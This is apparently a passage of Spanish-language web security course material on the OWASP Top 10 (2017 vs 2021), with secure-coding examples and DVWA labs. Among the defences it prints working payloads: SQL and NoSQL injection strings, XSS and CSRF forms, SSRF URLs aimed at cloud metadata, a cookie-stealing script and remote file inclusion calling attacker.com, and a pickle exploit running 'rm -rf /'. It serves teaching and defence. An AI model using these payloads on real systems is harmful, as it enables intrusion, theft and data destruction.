            'requested_action': action,
            'access_denied': True
        }
        
        self.log_security_event('authorization_failure', details, 'HIGH', 
                              user_id=user_id, ip_address=ip_address)
    
    def log_input_validation_failure(self, input_field: str, input_value: str, 
                                   validation_rule: str, ip_address: str):
        """Log input validation failures"""
        details = {
            'field_name': input_field,
            'validation_rule': validation_rule,
            'input_hash': hashlib.sha256(input_value.encode()).hexdigest(),
            'input_length': len(input_value)
        }
        
        self.log_security_event('input_validation_failure', details, 'MEDIUM', 
                              ip_address=ip_address)
    
    def log_suspicious_activity(self, activity_type: str, description: str,
                              user_id: str = None, ip_address: str = None):
        """Log suspicious activities"""
        details = {
            'activity_description': description,
            'detection_time': time.time()
        }
        
        self.log_security_event(f'suspicious_{activity_type}', details, 'HIGH',
                              user_id=user_id, ip_address=ip_address)
    
    def _generate_correlation_id(self) -> str:
        """Generate unique correlation ID for log entries"""
        return hashlib.md5(f"{time.time()}{id(self)}".encode()).hexdigest()[:16]
    
    def _sanitize_log_data(self, log_entry: Dict) -> Dict:
        """Remove or hash sensitive data from log entries"""
        sensitive_fields = ['password', 'ssn', 'credit_card', 'api_key', 'token']
        
        def sanitize_dict(d):
            for key, value in d.items():
                if isinstance(value, dict):
                    sanitize_dict(value)
                elif key.lower() in sensitive_fields:
                    if isinstance(value, str):
                        d[key] = hashlib.sha256(value.encode()).hexdigest()[:16]
                    else:
                        d[key] = '[REDACTED]'
        
        sanitize_dict(log_entry)
        return log_entry
    
    def _send_alert(self, log_entry: Dict):
        """Send immediate alerts for critical events"""
        # Implementation would depend on alerting system
        # Could integrate with email, Slack, PagerDuty, etc.
        pass

# Usage examples
security_logger = SecurityLogger()

# Log authentication attempt
security_logger.log_authentication_attempt(
    username='john.doe',
    success=False,
    ip_address='192.168.1.100',
    user_agent='Mozilla/5.0...'
)

# Log authorization failure
security_logger.log_authorization_failure(
    user_id='user123',
    resource='/admin/users',
    action='DELETE',
    ip_address='192.168.1.100'
)

# Log suspicious activity
security_logger.log_suspicious_activity(
    activity_type='multiple_failed_logins',
    description='5 failed login attempts in 1 minute',
    user_id='user123',
    ip_address='192.168.1.100'
)
```

---

## OWASP Top Ten 2021

### Introducción a los Cambios en 2021
El **OWASP Top 10 2021** representa una actualización significativa basada en más de 400,000 aplicaciones de 40+ organizaciones contribuyentes. Los cambios reflejan la evolución del panorama de amenazas web y nuevas tendencias en desarrollo de aplicaciones.

### Cambios Principales en la Lista 2021
```
Key Changes from 2017 to 2021:
├── New Categories
│   ├── A04: Insecure Design (completely new)
│   ├── A08: Software and Data Integrity Failures
│   └── A10: Server-Side Request Forgery (SSRF)
├── Merged Categories
│   ├── A02: Cryptographic Failures (was Sensitive Data Exposure)
│   ├── A07: Identification and Authentication Failures
│   └── A09: Security Logging and Monitoring Failures
├── Position Changes
│   ├── Broken Access Control moved to #1
│   ├── Injection dropped to #3
│   └── XSS dropped out of top 10
└── Renamed Categories
    ├── Several categories got more precise naming
    ├── Better alignment with current threat landscape
    └── Focus on modern application architectures
```

### Mapeo Detallado de Cambios 2017 vs 2021

#### Tabla Comparativa Completa
```
OWASP Top 10: 2017 vs 2021 Evolution
┌─────┬─────────────────────────────────┬─────────────────────────────────┐
│ Pos │           OWASP 2017           │           OWASP 2021           │
├─────┼─────────────────────────────────┼─────────────────────────────────┤
│ 1   │ A1: Injection                  │ A01: Broken Access Control     │
│ 2   │ A2: Broken Authentication      │ A02: Cryptographic Failures    │
│ 3   │ A3: Sensitive Data Exposure    │ A03: Injection                 │
│ 4   │ A4: XML External Entities      │ A04: Insecure Design           │
│ 5   │ A5: Broken Access Control      │ A05: Security Misconfiguration │
│ 6   │ A6: Security Misconfiguration  │ A06: Vulnerable Components     │
│ 7   │ A7: Cross-Site Scripting       │ A07: Identity & Auth Failures  │
│ 8   │ A8: Insecure Deserialization   │ A08: Software Integrity Fails  │
│ 9   │ A9: Known Vulnerable Components│ A09: Logging & Monitoring Fails│
│ 10  │ A10: Insufficient Logging      │ A10: Server-Side Request Forgery│
└─────┴─────────────────────────────────┴─────────────────────────────────┘

Key Insights:
├── Broken Access Control jumped from #5 to #1
├── Injection dropped from #1 to #3 but remains critical
├── XSS dropped out of top 10 (now combined with other categories)
├── Three completely new categories introduced
└── Greater emphasis on design and architecture security
```

---

## Análisis Comparativo 2017 vs 2021

### Tendencias y Evolución del Panorama de Amenazas

#### Factores de Cambio en el Top 10
```
Driving Forces Behind Changes:
├── Technology Evolution
│   ├── Increased API usage
│   ├── Microservices architecture adoption
│   ├── Cloud-native application development
│   ├── Containerization and orchestration
│   ├── DevOps and CI/CD pipeline integration
│   ├── Single Page Applications (SPAs)
│   └── Progressive Web Applications (PWAs)
├── Attack Sophistication
│   ├── Advanced persistent threats
│   ├── Supply chain attacks
│   ├── Business logic exploitation
│   ├── Zero-day vulnerability exploitation
│   ├── AI-powered attack tools
│   └── Social engineering integration
├── Industry Maturity
│   ├── Better input validation practices
│   ├── Framework security improvements
│   ├── Automated security testing
│   ├── Security awareness training
│   ├── Secure coding standards adoption
│   └── Security-by-design principles
└── Regulatory Pressure
    ├── GDPR compliance requirements
    ├── PCI DSS enforcement
    ├── Industry-specific regulations
    ├── Data breach notification laws
    ├── Privacy protection mandates
    └── Cybersecurity frameworks adoption
```

#### Análisis de Vulnerabilidades Emergentes vs Declinantes

**Vulnerabilidades en Ascenso:**
```
Rising Security Threats:
├── Access Control Issues
│   ├── 94% of applications tested had some form of broken access control
│   ├── Average incidence rate: 3.81%
│   ├── Maximum incidence rate: 55.97%
│   ├── Mapped to 34 CWEs
│   └── 262,407 occurrences in the dataset
├── Cryptographic Failures
│   ├── Focus on data protection failures
│   ├── Cloud storage misconfigurations
│   ├── Weak encryption implementations
│   ├── Key management failures
│   └── Transport layer security issues
├── Insecure Design (New Category)
│   ├── Architectural security flaws
│   ├── Business logic vulnerabilities
│   ├── Threat modeling gaps
│   ├── Security control design failures
│   └── Secure development lifecycle gaps
└── Server-Side Request Forgery (New)
    ├── Cloud infrastructure exploitation
    ├── Internal network reconnaissance
    ├── Service mesh vulnerabilities
    ├── Container escape techniques
    └── Microservice communication abuse
```

**Vulnerabilidades en Declive:**
```
Declining Security Issues:
├── Cross-Site Scripting (XSS)
│   ├── Dropped out of top 10
│   ├── Better framework protections
│   ├── Content Security Policy adoption
│   ├── Automated input validation
│   ├── Security-aware development
│   └── Modern JavaScript framework protections
├── XML External Entities (XXE)
│   ├── Reduced XML usage in modern applications
│   ├── JSON adoption over XML
│   ├── Better XML parser configurations
│   ├── Library-level protections
│   └── Developer awareness improvements
└── Traditional Injection (Position Drop)
    ├── Better ORM usage
    ├── Parameterized query adoption
    ├── Input validation improvements
    ├── Framework-level protections
    └── Security testing automation
```

### Implicaciones para la Seguridad Moderna

#### Shift-Left Security Approach
```
Modern Security Integration:
├── Design Phase Security
│   ├── Threat modeling integration
│   ├── Security requirement definition
│   ├── Architecture security review
│   ├── Security control selection
│   └── Risk assessment incorporation
├── Development Phase Security
│   ├── Secure coding practices
│   ├── Static analysis integration
│   ├── IDE security plugins
│   ├── Code review security focus
│   └── Security unit testing
├── Testing Phase Security
│   ├── Dynamic application security testing
│   ├── Interactive application security testing
│   ├── Penetration testing automation
│   ├── API security testing
│   └── Infrastructure security testing
└── Deployment Phase Security
    ├── Container security scanning
    ├── Infrastructure as code security
    ├── Configuration security validation
    ├── Runtime protection deployment
    └── Monitoring and alerting setup
```

---

## Vulnerabilidades Web Específicas

### SQL Injection - Análisis Profundo

#### Técnicas Avanzadas de SQL Injection

**Error-based SQL Injection:**
```sql
-- MySQL Error-based extraction
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- MSSQL Error-based extraction
' AND 1=CONVERT(int, (SELECT @@version)) --

-- Oracle Error-based extraction
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --

-- PostgreSQL Error-based extraction
' AND 1=CAST((SELECT version()) AS int) --
```

**Union-based SQL Injection:**
```sql
-- Determine number of columns
' ORDER BY 1-- (continue incrementing until error)
' UNION SELECT NULL-- (add NULLs until no error)

-- Extract data
' UNION SELECT username,password,email FROM users--

-- Database enumeration
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Time-based Blind SQL Injection:**
```sql
-- MySQL time delay
' AND IF(1=1,SLEEP(5),0)--

-- MSSQL time delay
'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- PostgreSQL time delay
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle time delay
' AND 1=(CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2) ELSE 0 END)--
```

#### NoSQL Injection Techniques
```javascript
// MongoDB injection examples
// Authentication bypass
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}

// JavaScript injection in MongoDB
{"username": "admin", "password": {"$where": "sleep(5000) || true"}}

// Blind NoSQL injection
{"username": "admin", "password": {"$regex": "^a"}}

// CouchDB injection
{"selector": {"$where": "function() { return true; }"}}

// Cassandra CQL injection
"SELECT * FROM users WHERE username = '" + input + "'"
// Payload: admin'; DROP TABLE users; --
```

### Cross-Site Scripting (XSS) - Técnicas Avanzadas

#### XSS Attack Vectors Modernos
```
Advanced XSS Techniques:
├── DOM-based XSS Exploitation
│   ├── document.location manipulation
│   ├── document.referrer exploitation
│   ├── window.name abuse
│   ├── postMessage vulnerabilities
│   └── History API manipulation
├── Content Security Policy Bypasses
│   ├── JSONP callback abuse
│   ├── Angular template injection
│   ├── Inline event handler abuse
│   ├── Data URI scheme exploitation
│   └── Base tag injection
├── Filter Evasion Techniques
│   ├── Encoding-based bypasses
│   ├── HTML entity obfuscation
│   ├── JavaScript obfuscation
│   ├── Polyglot payloads
│   └── Mutation-based bypasses
└── Framework-specific XSS
    ├── React XSS vulnerabilities
    ├── Angular XSS patterns
    ├── Vue.js XSS issues
    └── Server-side template injection
```

**Advanced XSS Payloads:**
```html
<!-- CSP bypass using JSONP -->
<script src="https://api.example.com/jsonp?callback=alert"></script>

<!-- DOM-based XSS exploitation -->
<script>
location.hash = '#<img src=x onerror=alert(1)>';
</script>

<!-- Mutation XSS -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Polyglot XSS payload -->
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

<!-- Angular template injection -->
{{constructor.constructor('alert(1)')()}}

<!-- Server-side template injection -->
${7*7}
#{7*7}
{{7*7}}
```

### Cross-Site Request Forgery (CSRF)

#### CSRF Attack Evolution
```
CSRF Attack Categories:
├── Traditional CSRF
│   ├── GET request CSRF
│   ├── POST request CSRF
│   ├── Multipart form CSRF
│   └── JSON-based CSRF
├── Advanced CSRF Techniques
│   ├── Login CSRF
│   ├── Logout CSRF
│   ├── File upload CSRF
│   ├── Password change CSRF
│   └── Account takeover CSRF
├── SameSite Cookie Bypasses
│   ├── Subdomain manipulation
│   ├── Domain confusion attacks
│   ├── Navigation-based bypasses
│   └── WebSocket CSRF
└── Modern Application CSRF
    ├── Single Page Application CSRF
    ├── API endpoint CSRF
    ├── Mobile application CSRF
    └── Progressive Web App CSRF
```

**CSRF Attack Examples:**
```html
<!-- Basic CSRF attack -->
<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF with form submission -->
<form action="https://api.example.com/users" method="POST" 
      enctype="text/plain">
    <input name='{"username":"attacker","role":"admin","extra":"' 
           value='"}' type='hidden'>
</form>

<!-- File upload CSRF -->
<form action="https://example.com/upload" method="POST" 
      enctype="multipart/form-data">
    <input type="file" name="file" value="malicious.php">
</form>
```

**CSRF Protection Implementation:**
```python
# Flask-WTF CSRF protection
from flask_wtf.csrf import CSRFProtect
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired

# Initialize CSRF protection
csrf = CSRFProtect(app)

# Form with CSRF token
class UserForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    submit = SubmitField('Submit')

# Template usage
# {{ form.hidden_tag() }} automatically includes CSRF token

# Manual CSRF validation
@app.route('/api/user', methods=['POST'])
def update_user():
    token = request.form.get('csrf_token') or request.headers.get('X-CSRFToken')
    try:
        csrf.validate_csrf(token)
    except ValidationError:
        abort(400, 'CSRF token missing or invalid')
    
    # Process request
    return jsonify({'status': 'success'})

# Double Submit Cookie pattern
import secrets

def generate_csrf_token():
    token = secrets.token_urlsafe(32)
    session['csrf_token'] = token
    return token

def validate_csrf_token(request_token):
    session_token = session.get('csrf_token')
    return session_token and request_token == session_token
```

### Server-Side Request Forgery (SSRF)

#### SSRF Attack Scenarios
```
SSRF Exploitation Categories:
├── Internal Network Scanning
│   ├── Port scanning via HTTP requests
│   ├── Service enumeration
│   ├── Banner grabbing
│   ├── Network topology discovery
│   └── Firewall bypass techniques
├── Cloud Metadata Exploitation
│   ├── AWS EC2 metadata service
│   ├── Azure Instance Metadata Service
│   ├── Google Cloud metadata server
│   ├── DigitalOcean metadata API
│   └── Kubernetes service account tokens
├── Protocol Smuggling
│   ├── Gopher protocol exploitation
│   ├── File protocol abuse
│   ├── FTP protocol smuggling
│   ├── LDAP protocol exploitation
│   └── Dict protocol abuse
└── Application-Specific Attacks
    ├── Database port exploitation
    ├── Redis command execution
    ├── Memcached manipulation
    ├── ElasticSearch queries
    └── MongoDB operations
```

**SSRF Payload Examples:**
```python
# AWS metadata extraction
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal service discovery
http://localhost:80/admin
http://127.0.0.1:22/
http://10.0.0.1:3306/

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a

# File system access
file:///etc/passwd
file:///proc/self/environ
file:///var/log/apache2/access.log

# DNS-based SSRF
http://malicious.attacker.com/redirect?url=http://internal-service/
```

**SSRF Protection Implementation:**
```python
import ipaddress
import urllib.parse
from urllib.error import URLError
import socket

class SSRFProtection:
    def __init__(self):
        # Define blocked networks
        self.blocked_networks = [
            ipaddress.IPv4Network('127.0.0.0/8'),    # Loopback
            ipaddress.IPv4Network('10.0.0.0/8'),     # Private A
            ipaddress.IPv4Network('172.16.0.0/12'),  # Private B
            ipaddress.IPv4Network('192.168.0.0/16'), # Private C
            ipaddress.IPv4Network('169.254.0.0/16'), # Link-local
            ipaddress.IPv4Network('224.0.0.0/4'),    # Multicast
        ]
        
        # Allowed protocols
        self.allowed_protocols = ['http', 'https']
        
        # Blocked ports
        self.blocked_ports = [22, 23, 25, 53, 135, 445, 993, 995, 1433, 3306, 5432, 6379, 11211]
    
    def validate_url(self, url: str) -> bool:
        """Validate URL against SSRF protection rules"""
        try:
            parsed = urllib.parse.urlparse(url)
            
            # Check protocol
            if parsed.scheme not in self.allowed_protocols:
                return False
            
            # Check for suspicious characters
            if '@' in parsed.netloc or '%' in parsed.netloc:
                return False
            
            # Extract hostname and port
            hostname = parsed.hostname
            port = parsed.port or (80 if parsed.scheme == 'http' else 443)
            
            # Check port
            if port in self.blocked_ports:
                return False
            
            # Resolve hostname to IP
            try:
                ip = socket.gethostbyname(hostname)
            except socket.gaierror:
                return False
            
            # Check if IP is in blocked networks
            ip_addr = ipaddress.IPv4Address(ip)
            for network in self.blocked_networks:
                if ip_addr in network:
                    return False
            
            return True
            
        except Exception:
            return False
    
    def safe_request(self, url: str, timeout: int = 5):
        """Make a safe HTTP request with SSRF protection"""
        if not self.validate_url(url):
            raise ValueError("URL blocked by SSRF protection")
        
        import requests
        
        # Additional safety headers
        headers = {
            'User-Agent': 'Safe-HTTP-Client/1.0'
        }
        
        try:
            response = requests.get(
                url, 
                headers=headers,
                timeout=timeout,
                allow_redirects=False,  # Prevent redirect-based bypasses
                stream=False
            )
            
            # Limit response size
            max_size = 1024 * 1024  # 1MB
            if len(response.content) > max_size:
                raise ValueError("Response too large")
            
            return response
            
        except requests.RequestException as e:
            raise ValueError(f"Request failed: {str(e)}")

# Usage example
ssrf_protection = SSRFProtection()

@app.route('/fetch', methods=['POST'])
def fetch_url():
    url = request.json.get('url')
    
    try:
        response = ssrf_protection.safe_request(url)
        return jsonify({
            'status': 'success',
            'data': response.text[:1000]  # Limit returned data
        })
    except ValueError as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400
```

### Local File Inclusion (LFI) y Remote File Inclusion (RFI)

#### File Inclusion Attack Vectors
```
File Inclusion Categories:
├── Local File Inclusion (LFI)
│   ├── Path traversal attacks
│   ├── Null byte injection
│   ├── Double encoding bypass
│   ├── Log poisoning techniques
│   └── Wrapper abuse (php://, data://)
├── Remote File Inclusion (RFI)
│   ├── HTTP-based inclusion
│   ├── FTP-based inclusion
│   ├── SMB share inclusion
│   ├── Data URI inclusion
│   └── PHP wrapper exploitation
├── Advanced LFI Techniques
│   ├── Proc filesystem exploitation
│   ├── Session file poisoning
│   ├── Email log poisoning
│   ├── Apache log poisoning
│   └── SSH log poisoning
└── Filter Bypass Methods
    ├── Encoding-based bypasses
    ├── Case variation techniques
    ├── Unicode normalization abuse
    ├── Compression wrapper bypass
    └── Stream filter chains
```

**LFI/RFI Payload Examples:**
```php
// Basic LFI
include($_GET['file']);
// Payload: ?file=../../../etc/passwd

// Null byte bypass (PHP < 5.3)
?file=../../../etc/passwd%00.php

// PHP wrapper exploitation
?file=php://filter/convert.base64-encode/resource=config.php
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

// Log poisoning
?file=../../../var/log/apache2/access.log
// After injecting PHP code in User-Agent

// Remote file inclusion
?file=http://attacker.com/shell.php
?file=ftp://attacker.com/shell.php
```

**Secure File Inclusion Implementation:**
```php
<?php
class SecureFileIncluder {
    private $allowed_files = [
        'home' => 'templates/home.php',
        'about' => 'templates/about.php',
        'contact' => 'templates/contact.php',
        'products' => 'templates/products.php'
    ];
    
    private $base_path = '/var/www/app/';
    
    public function includeFile($file_key) {
        // Whitelist validation
        if (!array_key_exists($file_key, $this->allowed_files)) {
            throw new InvalidArgumentException('Invalid file requested');
        }
        
        $file_path = $this->allowed_files[$file_key];
        $full_path = $this->base_path . $file_path;
        
        // Path traversal protection
        $real_path = realpath($full_path);
        $real_base = realpath($this->base_path);
        
        if ($real_path === false || 
            strpos($real_path, $real_base) !== 0) {
            throw new SecurityException('Path traversal detected');
        }
        
        // File existence check
        if (!file_exists($real_path)) {
            throw new FileNotFoundException('File not found');
        }
        
        // Include file safely
        include $real_path;
    }
    
    public function validateUploadedFile($uploaded_file) {
        // File size validation
        if ($uploaded_file['size'] > 5 * 1024 * 1024) { // 5MB
            throw new InvalidArgumentException('File too large');
        }
        
        // MIME type validation
        $allowed_types = ['image/jpeg', 'image/png', 'text/plain', 'application/pdf'];
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $uploaded_file['tmp_name']);
        
        if (!in_array($mime_type, $allowed_types)) {
            throw new InvalidArgumentException('Invalid file type');
        }
        
        // File extension validation
        $file_extension = pathinfo($uploaded_file['name'], PATHINFO_EXTENSION);
        $allowed_extensions = ['jpg', 'jpeg', 'png', 'txt', 'pdf'];
        
        if (!in_array(strtolower($file_extension), $allowed_extensions)) {
            throw new InvalidArgumentException('Invalid file extension');
        }
        
        // Magic number validation
        $file_contents = file_get_contents($uploaded_file['tmp_name'], false, null, 0, 1024);
        
        if (!$this->validateMagicNumbers($file_contents, $mime_type)) {
            throw new SecurityException('File content mismatch');
        }
        
        return true;
    }
    
    private function validateMagicNumbers($file_contents, $expected_mime) {
        $magic_numbers = [
            'image/jpeg' => ["\xFF\xD8\xFF"],
            'image/png' => ["\x89PNG\r\n\x1a\n"],
            'application/pdf' => ["%PDF-"],
            'text/plain' => [] // Text files don't have consistent magic numbers
        ];
        
        if (!isset($magic_numbers[$expected_mime])) {
            return false;
        }
        
        if (empty($magic_numbers[$expected_mime])) {
            return true; // Skip validation for text files
        }
        
        foreach ($magic_numbers[$expected_mime] as $magic) {
            if (strpos($file_contents, $magic) === 0) {
                return true;
            }
        }
        
        return false;
    }
}

// Usage example
$includer = new SecureFileIncluder();

try {
    $page = $_GET['page'] ?? 'home';
    $includer->includeFile($page);
} catch (Exception $e) {
    error_log('File inclusion error: ' . $e->getMessage());
    include 'templates/error.php';
}
?>
```
```
Los **ataques XSS** ocurren cuando una aplicación incluye datos no confiables en una nueva página web sin validación o escape apropiados, o actualiza una página web existente con datos proporcionados por el usuario usando una API del navegador que puede crear HTML o JavaScript.

```
XSS Attack Types:
├── Reflected XSS
│   ├── Non-persistent
│   ├── Payload in URL parameters
│   ├── Immediate execution
│   ├── Social engineering required
│   └── Server-side reflection
├── Stored XSS
│   ├── Persistent payload
│   ├── Database storage
│   ├── Affects multiple users
│   ├── Higher impact potential
│   └── No user interaction needed
├── DOM-based XSS
│   ├── Client-side vulnerability
│   ├── JavaScript manipulation
│   ├── URL fragment exploitation
│   ├── No server involvement
│   └── Modern application risk
└── Blind XSS
    ├── Out-of-band execution
    ├── Admin panel targeting
    ├── Email/report systems
    └── Delayed payload execution
```

#### XSS Prevention
```html
<!-- Input Validation Example -->
<script>
function validateInput(input) {
    // Whitelist validation
    const allowedPattern = /^[a-zA-Z0-9\s]+$/;
    return allowedPattern.test(input);
}
</script>

<!-- Output Encoding Example -->
<%@ page import="org.owasp.encoder.Encode" %>
<div>Hello <%= Encode.forHtml(userName) %></div>

<!-- Content Security Policy -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline';
               object-src 'none';">
```

### A8: Insecure Deserialization

#### Deserialización Insegura
La **deserialización insegura** conduce frecuentemente a la ejecución remota de código. Incluso si los fallos de deserialización no resultan en ejecución remota de código, pueden ser utilizados para realizar ataques, incluyendo ataques de reproducción, ataques de inyección y ataques de escalamiento de privilegios.

```python
# Ejemplo vulnerable (Python pickle)
import pickle
import base64

# Payload malicioso
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('rm -rf /',))

# Serialización del payload
exploit = Exploit()
serialized = base64.b64encode(pickle.dumps(exploit))

# Deserialización vulnerable
user_data = base64.b64decode(request.data['serialized_object'])
obj = pickle.loads(user_data)  # ¡PELIGROSO!
```

---

## Objetivos de Aprendizaje

### Objetivos Generales

Al finalizar este tema, el estudiante será capaz de:

1. **Comprender las vulnerabilidades web modernas** y su impacto en la seguridad de aplicaciones web
2. **Analizar y comparar** las diferencias entre OWASP Top 10 2017 y 2021
3. **Identificar y evaluar** diferentes tipos de keyloggers y sus contramedidas
4. **Implementar medidas de seguridad** para proteger aplicaciones web
5. **Aplicar técnicas de testing** de seguridad en aplicaciones web
6. **Configurar y administrar** Web Application Firewalls (WAF)
7. **Desarrollar aplicaciones seguras** siguiendo las mejores prácticas

### Objetivos Específicos

#### Conocimiento Técnico
- Identificar los 10 principales riesgos de seguridad según OWASP 2017 y 2021
- Explicar el funcionamiento de keyloggers de hardware y software
- Describir técnicas avanzadas de SQL Injection y NoSQL Injection
- Analizar vulnerabilidades XSS, CSRF, SSRF y LFI/RFI
- Evaluar implementaciones de autenticación y control de acceso
- Comprender fallas criptográficas y exposición de datos sensibles

#### Habilidades Prácticas
- Configurar headers de seguridad HTTP
- Implementar validación de entrada y codificación de salida
- Desarrollar sistemas de logging y monitoreo de seguridad
- Configurar Content Security Policy (CSP)
- Realizar testing manual y automatizado de seguridad
- Configurar Web Application Firewalls

#### Competencias Profesionales
- Desarrollar políticas de seguridad para aplicaciones web
- Realizar evaluaciones de riesgo de seguridad
- Implementar controles de seguridad en el ciclo de desarrollo
- Responder a incidentes de seguridad web
- Capacitar equipos en desarrollo seguro

---

## Laboratorios Prácticos

### Laboratorio 1: Detección y Prevención de Keyloggers

#### Objetivo
Identificar diferentes tipos de keyloggers y implementar contramedidas efectivas.

#### Materiales
- Máquina virtual Windows/Linux
- Herramientas anti-keylogger
- Simuladores de keylogger (con fines educativos)
- Herramientas de monitoreo del sistema

#### Actividades

**Actividad 1.1: Detección de Keyloggers Software**
```powershell
# PowerShell script para detectar procesos sospechosos
Get-Process | Where-Object {$_.ProcessName -match "keylog|capture|spy"} | 
    Select-Object ProcessName, Id, Path, Company

# Verificar hooks de teclado
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | 
    Where-Object {$_.Message -match "SetWindowsHookEx"}

# Analizar conexiones de red sospechosas
netstat -an | findstr ESTABLISHED
```

**Actividad 1.2: Implementación de Contramedidas**
```python
# Script de protección anti-keylogger
import psutil
import time
import hashlib
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class AntiKeyloggerMonitor:
    def __init__(self):
        self.suspicious_processes = []
        self.keyboard_hooks = []
    
    def monitor_processes(self):
        """Monitor for suspicious processes"""
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            try:
                proc_info = proc.info
                if self.is_suspicious_process(proc_info):
                    self.suspicious_processes.append(proc_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    
    def is_suspicious_process(self, proc_info):
        """Identify potentially malicious processes"""
        suspicious_keywords = ['keylog', 'capture', 'spy', 'monitor']
        proc_name = proc_info['name'].lower()
        return any(keyword in proc_name for keyword in suspicious_keywords)
    
    def generate_report(self):
        """Generate security report"""
        report = {
            'timestamp': time.time(),
            'suspicious_processes': len(self.suspicious_processes),
            'processes': self.suspicious_processes
        }
        return report

# Ejecutar monitor
monitor = AntiKeyloggerMonitor()
monitor.monitor_processes()
report = monitor.generate_report()
print(f"Security Report: {report}")
```

### Laboratorio 2: Explotación de Vulnerabilidades OWASP Top 10

#### Objetivo
Identificar y explotar vulnerabilidades del OWASP Top 10 en un entorno controlado.

#### Materiales
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- OWASP ZAP
- Navegador web con herramientas de desarrollo

#### Actividades

**Actividad 2.1: SQL Injection**
```sql
-- Identificar vulnerabilidades SQL Injection
-- URL: http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit

-- Prueba de inyección básica
1' OR '1'='1

-- Enumeración de base de datos
1' UNION SELECT null,concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- 

-- Extracción de datos
1' UNION SELECT null,concat(user,':',password) FROM users-- 
```

**Actividad 2.2: Cross-Site Scripting (XSS)**
```html
<!-- XSS Reflejado -->
<!-- Input: <script>alert('XSS')</script> -->

<!-- XSS Almacenado -->
<script>
document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- XSS basado en DOM -->
<script>
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
</script>
<!-- URL: http://vulnerable.com/page.html#<script>alert('DOM XSS')</script> -->
```

**Actividad 2.3: CSRF Attack**
```html
<!-- CSRF para cambio de contraseña -->
<form action="http://vulnerable-site.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
    <input type="submit" value="Click here for prize!">
</form>
<script>
document.forms[0].submit();
</script>
```

### Laboratorio 3: Implementación de Controles de Seguridad

#### Objetivo
Implementar controles de seguridad para proteger aplicaciones web contra las vulnerabilidades del OWASP Top 10.

#### Materiales
- Entorno de desarrollo (Node.js, Python, o PHP)
- Base de datos (MySQL, PostgreSQL)
- Servidor web (Apache, Nginx)

#### Actividades

**Actividad 3.1: Implementación de Validación Segura**
```javascript
// Validación de entrada segura
const validator = require('validator');
const xss = require('xss');

function secureValidation(input) {
    // Sanitización XSS
    const sanitized = xss(input);
    
    // Validación de longitud
    if (sanitized.length > 500) {
        throw new Error('Input too long');
    }
    
    // Validación de caracteres permitidos
    if (!validator.isAlphanumeric(sanitized, 'en-US', {ignore: ' .-'})) {
        throw new Error('Invalid characters detected');
    }
    
    return sanitized;
}

// Consultas parametrizadas
const mysql = require('mysql2');

function secureQuery(userId) {
    const query = 'SELECT * FROM users WHERE id = ?';
    return db.execute(query, [userId]);
}
```

**Actividad 3.2: Configuración de Headers de Seguridad**
```javascript
// Express.js middleware para headers de seguridad
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    crossOriginEmbedderPolicy: false,
}));

// Headers adicionales
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    next();
});
```

### Laboratorio 4: Configuración de WAF

#### Objetivo
Configurar y administrar un Web Application Firewall para proteger aplicaciones web.

#### Materiales
- ModSecurity con Apache/Nginx
- OWASP Core Rule Set (CRS)
- Aplicación web de prueba

#### Actividades

**Actividad 4.1: Instalación y Configuración de ModSecurity**
```apache
# Configuración básica de ModSecurity
LoadModule security2_module modules/mod_security2.so

<IfModule mod_security2.c>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess Off
    SecRequestBodyLimit 13107200
    SecRequestBodyNoFilesLimit 131072
    SecRequestBodyInMemoryLimit 131072
    SecRequestBodyLimitAction Reject
    SecPcreMatchLimit 250000
    SecPcreMatchLimitRecursion 250000
    
    # Logging
    SecAuditEngine RelevantOnly
